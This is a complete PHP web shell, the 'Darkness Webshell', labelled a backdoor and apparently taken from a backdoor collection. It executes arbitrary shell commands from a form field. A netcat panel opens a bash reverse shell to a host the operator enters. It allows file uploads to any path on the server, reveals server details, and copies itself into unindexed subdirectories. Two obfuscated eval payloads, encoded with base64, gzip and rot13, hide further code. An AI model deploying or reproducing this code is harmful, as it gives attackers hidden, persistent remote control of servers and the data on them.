<?php
// from https://github.com/1337r0j4n/php-backdoors
error_reporting(0);

$colours = array(
        "#b43104",
        "#b43104",
        "#b43104",
        "#b43104");
$copyToSubs = true;
$copyToSubsExcluded = array("..");

$blacklistArray = array(".git");

# blacklist file name
$blacklistFile = ".blacklist";

# initialising variables
$thisScript = basename(__FILE__);
$thisDir = str_replace('/'.$thisScript, '', $_SERVER['SCRIPT_NAME']);
$fileList = array();
$dirList = array();
$dirSize = 0;

# checking if the blacklist file exists, reading it into array
if (file_exists($blacklistFile)) {
    $blacklist = array_merge($blacklistArray, file($blacklistFile, FILE_IGNORE_NEW_LINES));
}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));

# reading directory
if ($dh = opendir('.')) {
    while (($itemName = readdir ($dh))) {
        # ignoring certain files, and all files on the blacklist                
        if ($itemName != "." && $itemName != ".." && $itemName != $thisScript
                && $itemName != ".htpasswd" && $itemName != ".htaccess"
                && $itemName != $blacklistFile && !in_array($itemName, $blacklist)) {
            if (is_file($itemName)) {
                # file: adding file information to file array
                $stat = stat($itemName);
                $info = pathinfo($itemName);

                
                $fileList[] = array(
                    'name'  => $info['filename'],
                    'ext'   => $info['extension'],
                    'size'  => setSize($stat['size'], 2),
                    'date'  => date("Y-m-d, H:i", $stat['mtime'])
                );

                # adding size to total directory size
                $dirSize += filesize($itemName);
            } else if (is_dir($itemName)) {
                # directory: adding directory information to directory array
                $stat = stat($itemName);

                $dirList[] = array(
                    'name'  => $itemName,
                    'date'  => date("Y-m-d, H:i", $stat['mtime'])
                );

                # copying script to subdirectory if no index file is present
                if ( $copyToSubs && !is_file( $itemName . DIRECTORY_SEPARATOR . "index.php" )
                                 && !is_file( $itemName . DIRECTORY_SEPARATOR . "index.html" )
                                 && !is_file( $itemName . DIRECTORY_SEPARATOR . "index.htm" )
                                 && !in_array( $itemName, $copyToSubsExcluded ) ) {
                    copy("index.php", $itemName . DIRECTORY_SEPARATOR . "index.php");
                }
            }
        }
    }
}
closedir($dh);

# sorting lists alphabetically
usort($fileList, 'compareName');
usort($dirList, 'compareName');

# formatting directory size
$dirSize = setSize($dirSize, 2);

# selecting a colour for the layout
$colour = $colours[array_rand($colours)];

function setSize($size, $decimals) {
    # translating size in bytes into more readable string
    $scale = array('B ', 'kB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    $scaleCount = 0;

    while ($size > 1024) {
        $size /= 1024;
        $scaleCount++;
    }

    return sprintf("%.2f %s", $size, $scale[$scaleCount]);
}

function compareName($a, $b) {
    # name comparison for usort
    return strnatcasecmp($a['name'], $b['name']);
}

$version = phpversion();
$server_ip = $_SERVER['SERVER_ADDR'];
$df = disk_free_space("/");
$username = posix_getpwuid(posix_geteuid())['name'];
$ccc = getcwd(); 

function isa_bytes_to_gb($df, $decimal_places = 1 ){
    return number_format($df / 1073741824, $decimal_places);
}
$gigabytes = isa_bytes_to_gb($df);
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;

    $os_platform  = "Unknown OS Platform";

    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}
$user_os        = getOS();

$device_details = "<strong>Operating System: </strong>".$user_os."";

if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}

if (!empty($_POST['nc']) && !empty($_POST['port'])) {
  $netcat = shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/".$_POST['nc']."/".$_POST['port']." 0>&1'");
  echo $_POST['nc'];
  echo $_POST['port'];

}
?>


?>

<head>
   
    <style>
	    
#header {
                width: 50%;
                min-width: 500px;
                margin: 15px auto 0px auto;
                display: table; }

            #header img {
                    display: table-cell;
                    vertical-align: bottom;
                    background: <?php echo $colour; ?>; }

            #path {
                    color: <?php echo $colour; ?>;
                    width: 100%;
                    display: table-cell;
                    vertical-align: bottom;
                    white-space: pre-wrap;
                    text-indent: -40px; padding-left: 40px; }

                #path a {
                        padding-top: 1px;
                        color: <?php echo $colour; ?>;
                        text-decoration: none; }

                    #path a:hover {
                            color: white;
                            background: <?php echo $colour; ?>; }

                    #activedir {
                            padding-top: 1px;
                            color: white;
                            white-space: nowrap;
                            font-weight: bold;
                            background: <?php echo $colour; ?>; }

                    #path a:hover ~ #activedir {
                            color: <?php echo $colour; ?>;
                            background: white; }

        #container {
                width: 50%;
                min-width: 500px;
                margin: 0px auto; padding: 5px;
                clear: both;
                overflow: visible;
                border: 3px solid <?php echo $colour; ?>; }

            table {
                    width: 100%;
                    margin: 0px;
                    border-collapse: collapse; 
                    color: indianred;
                    }

                tr {
                        border-bottom: 1px solid #efefef; }

                    tr:hover {
                            background: <?php echo $colour; ?>;
                            color: white; }

                    tr:hover > td .filesymbol
                            {   color: white; }

                    tr:hover > td .filenameext
                            {   color: white; }

                table tr td a {
                        height: 100%;
                        display: block;
                        color: inherit;
                        text-decoration: none; }

                .dir {
                        background: #f0f0f0;
                        border-bottom: 1px solid #e4e4e4; }

                .filesymbol {
                        padding-right: 3px;
                        font-family: monospace;
                        color: <?php echo $colour; ?>; }

                .filename {
                        width: 100%;
                        word-break: break-all;
                        text-indent: -1em;
                        padding-left: 1.5em; }

                .filenameext {
                        font-style: italic;
                        color: <?php echo $colour; ?>;
                        word-break: keep-all; }

                .fileexttd {
                        text-align: center; }

                .filesize {
                        padding-left: 10px;
                        white-space: pre;
                        vertical-align: bottom;
                        text-align: right; }

                .filesizescale {
                        padding-left: 5px;
                        vertical-align: bottom;
                        text-align: left; }

                .filedate {
                        padding-left: 10px;
                        vertical-align: bottom;
                        text-align: right;}

        .nowrap {
                white-space: nowrap; }
 
body {
	font-family: 'Roboto', sans-serif;
	background: #fff;
}

.conatiner {
	width: 100%;
	height: 500px;
}
.wrap {
	display: -webkit-box;
	display: -ms-flexbox;
	display: flex;
	-ms-flex-wrap: wrap;
	    flex-wrap: wrap;
	-webkit-box-pack: center;
	    -ms-flex-pack: center;
	        justify-content: center;
	-webkit-box-align: center;
	    -ms-flex-align: center;
	        align-items: center;
	-webkit-box-orient: horizontal;
	-webkit-box-direction: normal;
	    -ms-flex-direction: row;
	        flex-direction: row;
}

.box {
	margin: 10px;
	width: 200px;
	height: 250px;
	text-align: center;
	border-radius: 3px;
	-webkit-transition: 200ms ease-in-out;
	-o-transition: 200ms ease-in-out;
	transition: 200ms ease-in-out;
	-webkit-box-shadow: 0 0 15px rgba(0,0,0,0.3);
	        box-shadow: 0 0 15px rgba(0,0,0,0.3);
}

.abox {
	width: 70%;
	height: 25px;
	text-align: center;
	border-radius: 3px;
    justify-content: center;
    flex-direction: row;
}

.box:hover {
	margin-bottom: -10px;
	-webkit-box-shadow: 0 0 5px rgba(0,0,0,0.7);
	        box-shadow: 0 0 5px rgba(0,0,0,0.7);
}
.box h1 {
	color: #fff;
	padding: 30px;
	margin-top: 100px;
	text-align: center;
	font-weight: 100;
	font-size: 25px;
	background: rgba(0,0,0,0.8);
	-webkit-box-shadow: 0 0 30px rgba(0,0,0,0.7);
	        box-shadow: 0 0 30px rgba(0,0,0,0.8);
}

.date h4 {
	color: #fff;
	font-weight: 300;
	text-align: center;
	letter-spacing: 3px;
	text-shadow: 0 0 3px rgba(0,0,0,0.9);
}
.poster {
	width: 130px;
	height:130px;
	margin: 10px auto;
	position: relative;
	border-radius: 100px;
}
.poster h4 {
	top: 16px;
	color: #fff;
	position: relative;
	font-size: 80px;
	text-align: center;
	font-weight: 100;
}
.one {
    background-color: #d61f1f;
    background-repeat: no-repeat;
	background-size: cover;
	background-position: center;
}
@-webkit-keyframes rotation {
		from {
				-webkit-transform: rotate(0deg);
		}
		to {
				-webkit-transform: rotate(359deg);
		}
}

body {
margin-top: 0px; /*  Change back to 50px when navbar is implemented again. */
  margin-bottom: 50px;
  background-color: #0D0D0D;
}

header {
  margin-top: 75px;
  margin-bottom: 75px;
}

.navbar-left {
  margin-left: 75px;
}

.navbar-right {
  margin-right: 50px;
}

.navbar-custom {
  background: #000;
  box-shadow: 0px 0px 20px #050505;
  padding-top: 3px;
  padding-bottom: 3px;
  position: fixed;
  top: 0;
  width: 100%;
  z-index: 9999;
}

.navigation {
  font-family: 'Abel', monospace;
  font-size: 16px;
  text-shadow: 0px 0px 0.5px #F73434;
  font-weight: bold;
  letter-spacing: 3px;

}

section {
  margin-top: 200px;
  margin-bottom: 200px;
}

.cyber-face {
  display: block;
  margin-left: auto;
  margin-right: auto;
}

.cyber-squeaks {
  font-size: 20px;
  font-weight: bold;
  color: transparent;
  text-shadow: 0px 0px 0.75px #C73232;
  letter-spacing: 14px;
  white-space: nowrap;
  margin-top: 15px;
  text-align: center;
}

.cyber-speaks {
  font-family: 'Unica One', monospace;
  font-size: 70px;
  font-weight: bold;
  color: transparent;
  text-shadow: 0px 0px 1px #C73232;
  margin-top: -32px;
  white-space: nowrap;
  text-align: center;
}

.cyber-says {
  font-family: 'Unica One', monospace;
  font-size: 18px;
  color: transparent;
  text-shadow: 0px 0px 0.5px #d4b85f;
  margin-top: -30px;
  white-space: nowrap;
  text-align: center;
  letter-spacing: 5px;
}

hr {
  border: 0;
  height: 2px;
  background-image: linear-gradient(to right, rgba(0, 0, 0, 0), rgba(196, 196, 69, 0.2), #EB2F2F, rgba(196, 196, 69, 0.2), rgba(0, 0, 0, 0));
}

.section-headers {
  font-family: 'Abel', monospace;
  font-size: 30px;
  font-weight: bold;
  color: transparent;
  text-shadow: 0px 0px 0.25px #C73232;
  letter-spacing: 3px;
  margin-bottom: 50px;
}

.attributes-text {
  font-family: 'Unica One', monospace;
  color: transparent;
  text-shadow: 0px 0px 0.5px #d4b85f;
}

ul {
  list-style-type: none;
}

.section-paragraph {
  font-family: 'Abel', monospace;
  font-size: 20px;
  color: transparent;
  text-shadow: 0px 0px 0.5px #d4b85f;
  margin-top: 30px;
}

.progress {
  height: 10px;
  border-radius: 5px;
  background: linear-gradient(to bottom, rgba(180, 180, 180, 1) 0%, rgba(245, 245, 245, 1) 100%);
}

.progress-bar {
  background: #D10845;
}

.inventory-row {
  text-align: center;
  white-space: nowrap;
}

input {
  margin-bottom: 20px;
}

.form-text {
  font-family: 'Abel', monospace;
  font-size: 12px;
  text-align: right;
  letter-spacing: 2px;
  width: 50%;
  height: 20px;
  margin: auto;
  overflow: scroll;
  margin-bottom: 20px;
}

.btn {
  font-family: 'Abel', monospace;
  font-size: 11px;
  font-weight: bold;
  letter-spacing: 1px;
  width: 5%;
  height: 30px;
  color: #000;
  background-color: #DE0037;
}

.submit-button {
  text-align: center;
}


.crafting-pill {
  text-align: center;
  white-space: nowrap;
}

.crafting-bar {
  display: inline-block;
  vertical-align: text-top;
}

.nav {
    display: block;
    font: 13px Helvetica, Tahoma, serif;
    text-transform: uppercase;
    margin: 0; 
    padding: 0;
}

.nav li {
    display: inline-block;
    list-style: none;
}

.nav .button-dropdown {
    position: relative;
}

.nav li a {
    display: block;
    color: #d61f1f;
    background-color: #fff;
    padding: 10px 20px;
    text-decoration: none;
}

.nav li a span {
    display: inline-block;
    margin-left: 5px;
    font-size: 10px;
    color: #d61f1f;
}

.nav li a:hover, .nav li a.dropdown-toggle.active {
    background-color: #289dcc;
    color: #fff;
}

.nav li a:hover span, .nav li a.dropdown-toggle.active span {
    color: #d61f1f;
}

.form-control{
    width: 25%;
    height: 28px;
}

</style>

<title>{ Darkness } </title>
  </head>

<div class="container">
  <header>
    <p class="cyber-squeaks"><span class="rotate">שלום</p>
    <p class="cyber-speaks">  Darkness Webshell </p>
    <p class="cyber-says">PHP Tools and backdoor</p>  
  </header>

<center>

    <ul class="nav">
    <p class="cyber-squeaks"><span class="rotate">{Server Inforamtion}</p>
  <li>
    <a href="#">
     Server OS: <?php echo $user_os?>
    </a>
  </li>
  <li>
    <a href="#">
   PHP version: <?php echo $version?>
    </a>
  </li>
  <li>
    <a href="#">
  Server IP: <?php echo $server_ip?>
    </a>
  </li>
  <li>
    <a href="#">
  Disk Free: <?php echo $gigabytes?> GB
    </a>
  </li>
  <li>
    <a href="#">
    PROCESS OWNER: <?php echo $username?> 
    </a>
  </li>
  <li>
    <a href="#">
    Path: <?php echo $ccc?> 
    </a>
  </li>
</ul>
<br>

<div class="pb-2 mt-4 mb-2">
        </div>

        <form method="POST">
            <div class="form-group">
                <label for="cmd" class="cyber-says"><strong>>_Terminal:</strong></label>
                <input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" required>
                <button type="submit" class="btn">Execute</button>
            </div>
        </form>

<?php if ($cmd): ?>
        <div class="pb-2 mt-4 mb-2">
        <br>
            <p class="cyber-says">Output : </p>
        <pre>
        <p class="cyber-says"><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></p>
        </pre>
        </div>
<?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'): ?>
        <div class="cyber-says">
        <br>
            <p class="cyber-says"> Output: </p>
        </div>
        <pre><small>No result.</small></pre>
<?php endif; ?>
    </div>


    </center>

  <hr id="attributes"></hr>

    <div class="conatiner">
<div class="wrap">

	<div class="box one" onclick="showNetcat()" >
		<div class="date">
			<h4>NC</h4>
		</div>
		<H1>NETCAT</H1>
	</div>
	
	<div class="box one" onclick="payloadG()">
		<div class="date">
			<h4>Traveler</h4>
		</div>
		<h1>Files list</h1>
	</div>
	
	<div class="box one" onclick="fileupload()">
		<div class="date">
			<h4>Upload</h4>
		</div>
		<h1>UPLOAD FILES</h1>
	</div>
</div>

<center>
<br><br><br><br>


  <div id="netCatdiv"  style="display:none;" class="answer_list" > 
 <p class="cyber-says">Netcat Custom</p> 

 <form method="POST">
 <label for="nc" class="cyber-says"><strong>IP Addres:</strong></label>
 <input type="text" class="form-control" name="nc" id="nc" value="<?= htmlspecialchars($_POST['nc'], ENT_QUOTES, 'UTF-8') ?>" required>
<br>
 <label for="port" class="cyber-says"><strong>PORT:</strong></label>
 <input type="text" class="form-control" name="port" id="port" value="<?= htmlspecialchars($_POST['port'], ENT_QUOTES, 'UTF-8') ?>" required>
<br>
<button type="submit" class="btn">Execute</button>
</form>
  </div>

  <div id="payloadg"  style="display:none;" class="answer_list" > 
 <p class="cyber-says">Files list</p> 

 <div id="header">
    <div id="path"><?php
            # decomposing path, reverse order to make linking easier
            $path = array_reverse(explode('/', $thisDir));

            for ($i = sizeof($path) - 1; $i != -1; $i--) {
                # giving the root a name, to be clickable
                if ($path[$i] == "") $path[$i] = "root";

                if ($i == 0) {
                    # markup for currently active directory
                    echo "<span id=\"activedir\">&nbsp;/{$path[$i]} </span>";
                } else { 
                    # linking to directory
                    echo "<a href=\"" . str_repeat("../", rawurlencode($i)) . "\">&nbsp;/{$path[$i]} </a>";
                }
            }
        ?>&nbsp;<span class="nowrap">(<?php echo trim($dirSize); ?>)</span></div>
    <?php if ( $useHeaderImage ) { echo "<div id=\"logo\"><a href=\"$headerImageLink\"><img src=\"$headerImage\" alt=\"\" /></a></div>\n"; } ?>
</div>
<div id="container">
<?php
    # checking array sizes
    if (sizeof($dirList) == 0 && sizeof($fileList) == 0) {
        # no directories or files in the arrays
        echo "    <i>this directory is empty</i>\n";
    } else {
        echo "    <table>";
        # linking to directories
        foreach ($dirList as $dir) {
            echo "\n        <tr class=\"dir\">\n";
            echo "           <td class=\"filename\"><a href=\"" . rawurlencode($dir['name']) . "\"><span class=\"filesymbol\">&#x25ba;</span> {$dir['name']}</a></td>\n";
            echo "           <td class=\"filesize\"><a href=\"" . rawurlencode($dir['name']) . "\"></a></td>\n";
            echo "           <td class=\"filesizescale\"><a href=\"" . rawurlencode($dir['name']) . "\"></a></td>\n";
            echo "           <td class=\"filedate nowrap\"><a href=\"" . rawurlencode($dir['name']) . "\">{$dir['date']}</a></td>\n";
            echo "        </tr>";
        }

        # linking to files
        foreach ($fileList as $file) {
            $link = $file['name'] . ($file['ext'] == "" ? "" : "." . $file['ext']);

            echo "\n        <tr>\n";
            echo "           <td class=\"filename\"><a href=\"" . rawurlencode($link) . "\"><span class=\"filesymbol\">&#x25a1;</span> {$file['name']}" .  ($file['ext'] == "" ? "" : " <span class=\"filenameext\">{$file['ext']}</span>") . "</a></td>\n";
            echo "           <td class=\"filesize\"><a href=\"" . rawurlencode($link) . "\">" . substr($file['size'], 0, -3) . "</a></td>\n";
            echo "           <td class=\"filesizescale\"><a href=\"" . rawurlencode($link) . "\">" . substr($file['size'], -2, 2) . "</a></td>\n";
            echo "           <td class=\"filedate nowrap\"><a href=\"" . rawurlencode($link) . "\">{$file['date']}</a></td>\n";
            echo "        </tr>";
        }
        echo "\n    </table>\n";
    }
?><?php
$stt1 = "Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNz\x434pSi4upI5yUWJxqZhKfkpq\x63n5Kq\x41\x62SzKLVMQ6W4pMR\x41EwlY\x41w\x41\x3d";
$stt0 = "\x3dY\x41g6uM44t\x62\x41\x41J3Oh\x2bx\x61\x62r6G/fJX/n/d/vn8o1x1Q9\x43fHlZQ91\x62Hy\x62O/IsT/tkle\x43NpiTz4wLdOOzjHi4iEDqIj01\x63TGxWnqS9ndPDeUyrHGngDW464PzNQIPF5DLlYz2pEZuQX5/I3x3F8w\x431sugvurFYepz/PnofoDU8TIxvjErvp4\x61s0qkhDm\x41sqW2Jvh1G4ylROS\x42TTNY6xe\x41\x61pw\x63YNd9lJXqHjyi3NqM\x626iwMsuqDm\x62HEX18r9i3HOxWmwXppz0dovTvtPtmhVUq\x61pNw4UyKww3HOxi4jF\x2b7\x42Yp3LvMGwVhMD4nhIn\x42\x62E\x2bU\x62YM3GSQ\x42\x63FkTevwxty\x42r\x43ogUQzzmy4\x61Mnp\x63vfOpU\x42nyHK\x41DhkeHOpRNI/d\x62t\x2bdFmpzjHQjg\x43\x430IuQS6\x43JG\x61ovK0OZZ\x43/Y\x2bWOj\x62UJ\x2bNisuQEsWrlMdR\x63kePRpv\x62DXDJE6REkgimPJlsVmLXgLRm\x6221piDNTtuGtfRVTKOjivUo\x2bMSnjwJ9VN\x433RwxL7f\x42\x629\x2bzJ6ELWS\x631W5V5rHmzF\x41\x619MHkzRQS\x43z\x61SxiERUufZXiiHotsvXxDoWxuRRyWlv5\x42oleoQ5ItsDFJdukHwK7QjGL\x62Gmdwn1\x43DtONmYsR8Y3Lkm8wPfwoVzpZ\x41lk7MKXjMXLEUe4\x41vQ2Qms5pI4v33m25Vq5d\x434YZ3IPm8\x41ZQqPi8OM\x42frhrN2e1vSO\x63X\x62pPdZOGHF/Ql\x43QMF5Vw8fgw82gdNu\x61uop9uj\x41iKh\x41t\x43nMDoE6dOt7\x63PiSDZGoQNh2PGg8f7v3ODZzp9w4y\x43idiK\x430N4fFR9F633x\x41msKp\x2b\x61P\x2bJmQk0LFe102wlhGSv0QETVEVo79sL9fU4X\x62UjXrJ68hNdzH6\x41\x62/\x61pn3T8ET0s\x2bN6V\x62iOgRNfh4Ti9QG21vl5\x63j7\x61\x62Y7mk573MnW08h0yZXZEHZ\x41h\x624pIYQV8iFog\x41Yw\x430pPw\x63WWULVOGwi\x63Tru\x61mGSqGKntDofm\x43\x42hMWeYzX\x41fu9FLvpiW5OquKLIxF4UR\x2bx\x61KW\x2brvFW7oV3GJP\x42vl5FpZ6qq\x41\x61wjLtrrt4hzMtvJM/2tqv\x620GTlfOFp48W\x42I7MPKxlgm\x620T7FLjO\x61s5lghR5V\x42iI\x63/\x41ZSK\x43G8D9\x43DYhgXMKyMOuSIyyEYESer\x62mq\x63DM\x42x3y\x62K964ZQz\x2bDLwwQ\x62K7mjUx\x63\x637N\x2bMQDUfTzT\x61e\x43\x61r6olDIFznnE12DG0Z4oRzTqvKY8ku/soJ4SZ0/UfXprhjpV2oP8l/\x42R8m4\x63\x62\x61Tgp\x63I888\x2b/\x41oF\x61eiVXm\x62ZkXTjtlT0Qvyz44pJSL\x63GFHPM/\x2bEX03/rirrh8z\x63dtdTJsdsrdSpx\x63mTd5MfWDvn6xpus8rWiT\x634sl\x41LIiM\x43enqiPx7lx7EYfEJ\x61wtj6KE\x63FKLRrSThP4gymZdsJN\x62JjOrFnX\x62oKwwwg2I\x43Oy\x61\x429SrdKWkpOnTi\x63FrK0JN2oW/\x61QqFdEnsq\x43mgNZFQ\x62JTNeTUmvEnk7\x63T\x63\x43uLpDrtqTz3tQ9EkIp\x62rRmgyZ\x62GD3ojmudWGOF\x2b0D\x43XKotGIMHLQETgk6Im9\x62UunHunkrDsITTyqtdi\x42riII6u\x2b\x61V54X6l\x421UOFFKEweI2\x42lEeFz\x62hoS7sgfJYGpxIVwz\x41xrXEOq\x63Y\x61nSXlnRn/DpLopWEjuRp\x63sfg\x43\x2b5ixZy\x623Z\x63WMhGfZZQdf\x62zO/2j\x61Nj6vv9XX\x2beP3\x63858Je8L2/grD/n7/8pRz54PLR5T6EzGnJJ\x63vGXy/4\x41oRlm\x42FxfQpINmLP\x41JS\x6131U2jPUHZ5WGvy\x42TuyY9\x63UmunpOfMN6JE\x62G\x2bYplhV\x62Jp/z4\x43J\x63P\x41tJuKFXRrT\x63fpj\x62OgwnJPrjm8K17FXwr\x42QddwhtVnzfkoiO\x62eQPjRI0vUSg\x62zOUGxKx/\x62xo5\x2bQwGGknOYsVuiDy/nGrv8l9d/Pg\x63\x61tuoL/z\x431lwGkIOyNzioE\x41i/\x42\x620NiS\x41\x631L\x63N5\x43N\x63\x61LKkEQ5WvG6dygSG\x41I\x2bKyNj9kl67o7gRDU\x61h50fe\x635SOmj9/npfOiOxoEZgKTp01QKuJ4quwYi8/\x41w\x2bEU5pYhSi19YsU8rr4SqH6\x42i49vi\x41R\x43Zq5Nuz\x41FL0IMHqo3iPIqSMOzQSwi0iqsISmFf/\x2bjlKoGyoWmYk5FszNTMtUS\x41wkgSVWthRXpotWnSnNS\x639qT92D\x63nL\x418NjpjYtrI\x61KwTjDIu\x41\x2bys5KXlSkSvUYiywz\x43hvLsH\x61\x431j12Ldpp5U\x41p\x43J5u5uxVFqk8Q/9PDj3LG3\x63myG\x43PIHHG\x2bpU\x61e9YSKeVWufDe1VZ6\x61KJ\x62zgp0QRRM\x61twruqrWk2s21KMfj\x61yF\x62evL8\x2b22/9tpXtoh2xH\x63YnF7rmYM\x63yUKe7t3tzs2nr3t7e7u/8L0\x43I8058lprpT\x41H\x43JedPW/h2Hp7Hq/z\x42k\x63N8i5\x41jUPJlRuSS\x43gDP\x62egL5Ew7uGsDTr7oFJk4Eww1P4/MH\x2bDhR\x61PX\x62Y1e\x2bVYg6\x42wJe5rg\x421HQ\x2bFYg\x2b\x42wJe4r/\x42FE\x41\x2b1fg\x43\x42wJe4r\x2b\x42VE\x41\x2blfgG\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($stt1))));
?>
</div>

  </div>

  <div id="fileupload"  style="display:none;" class="answer_list" > 
 <p class="cyber-says">UPLOAD files</p> 

 <form enctype="multipart/form-data" name="file_upload" method="post" action="http://<?php echo $_SERVER['HTTP_HOST']; echo $_SERVER['REQUEST_URI'] ?>">
			<input type="file" name="file">
			<input type="submit" name="upload" value="upload"><br>
			<input type="text" name="target" size="50" value="Enter file location + File name" onfocus="FocusIn(document.file_upload.target)" onblur="FocusOut(document.file_upload.target)">
		</form>
		<?php
			if(isset($_POST['upload']))
			{
				$check = move_uploaded_file($_FILES['file']['tmp_name'], $_POST['target']);
				
				if($check == TRUE)
					echo '<pre>The file was uploaded successfully!!</pre>';
				else
					echo '<pre>File Upload was failed...</pre>';
			}
		?>
  </div>

<center>

</div>
    <hr id="attr2ibutes"></hr>   
    <br> <br>
    <br> <br>
    <br> <br>
    <br> <br>
  <footer>
   <div class="container">
     <div class="col-12">

     <p class="cyber-says">Version 1.0</p>  
   </div>
  </footer>

</div>

<script>

function showNetcat() {
   document.getElementById('netCatdiv').style.display = "block";
   document.getElementById('payloadg').style.display = "none";
   document.getElementById('fileupload').style.display = "none";
}

function payloadG() {
    document.getElementById('payloadg').style.display = "block";
   document.getElementById('netCatdiv').style.display = "none";
   document.getElementById('fileupload').style.display = "none";
}

function fileupload() {
    document.getElementById('fileupload').style.display = "block";
    document.getElementById('payloadg').style.display = "none";
   document.getElementById('netCatdiv').style.display = "none";
}
</script>
